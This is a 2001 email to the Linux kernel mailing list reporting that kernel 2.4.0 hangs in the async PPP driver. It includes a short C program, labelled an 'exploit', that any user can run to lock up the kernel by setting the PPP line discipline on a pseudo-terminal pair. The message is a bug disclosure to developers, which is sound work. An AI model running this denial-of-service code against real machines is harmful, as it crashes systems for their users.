Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S132887AbRAKQ6r>; Thu, 11 Jan 2001 11:58:47 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S132930AbRAKQ6c>; Thu, 11 Jan 2001 11:58:32 -0500
Received: from p020-53.netc.pt ([213.30.21.20]:22276 "EHLO thecrypt.utad.pt")
	by vger.kernel.org with ESMTP id <S132887AbRAKQ6N>;
	Thu, 11 Jan 2001 11:58:13 -0500
Message-ID: <3A5BF929.20B77ED0@alvie.com>
Date: Wed, 10 Jan 2001 05:54:49 +0000
From: Alvaro Lopes <alvieboy@alvie.com>
X-Mailer: Mozilla 4.75 [en] (X11; U; Linux 2.4.0 i686)
X-Accept-Language: en
MIME-Version: 1.0
To: linux-kernel@vger.kernel.org
CC: paulus@linuxcare.com
Subject: Kernel (2.4.0) lock-up using ppp_async - SEVERE - EXPLOIT RUNS AS ANY 
 USER.
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: 8bit
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

Hi all, hi Paulus.


Is somewhat odd how I got it, but here it goes.
I found a bug in 2.4.0 async PPP driver. I tested the same program in
2.2.17 and it run perfectly (and without hanging).

So, here goes the description:

2.4.0 Kernel hangs up when I do the following stuff:

	* Create a new PTY using openpty();
	* Fork using forkpty. Now, the child process does this:
		- Set the fd 0 line discipline to PPP;
		- tries infinitely to read the standard input.

	The parent process sets the line discipline of the master PTY fd to PPP
also, and then writes to it. As I was able to see (strace), the write
function never returns.

Hopefully SysRQ worked, and I was able to trace the bug to
ppp_async_push. It seems the endless loop there is really endless.
(sigh)

Here's a copy of the "exploit".

-- cut here --

/* Compile with -lutil */

#include <pty.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <linux/types.h>
#include <asm/types.h>
#include <net/if.h>
#include <linux/ppp_defs.h>


int main(int argc, char **argv) {
    int fdmaster,fdslave;
    struct termios t;
    struct winsize w;
    char name[80],fdn[8];
    int pppdisc = N_PPP;
    
    tcgetattr(0, &t);
    openpty(&fdmaster, &fdslave,name, &t, &w);
    switch (forkpty(&fdmaster,name,&t,&w)) {
    case 0:
            ioctl(0, TIOCSETD, &pppdisc);
        while (1==1) {
            char buf[80];
            read(0, buf, 80);
        }
    }

    ioctl(fdmaster, TIOCSETD, &pppdisc);

    while (1==1) {
        write(fdmaster,"OK\n", 3);
        sleep(1);
    }
}



-- cut here --


Álvaro Lopes 
Network Consulting
<alvieboy@alvie.com>
http://www.alvie.com/
-
To unsubscribe from this list: send the line "unsubscribe linux-kernel" in
the body of a message to majordomo@vger.kernel.org
Please read the FAQ at http://www.tux.org/lkml/
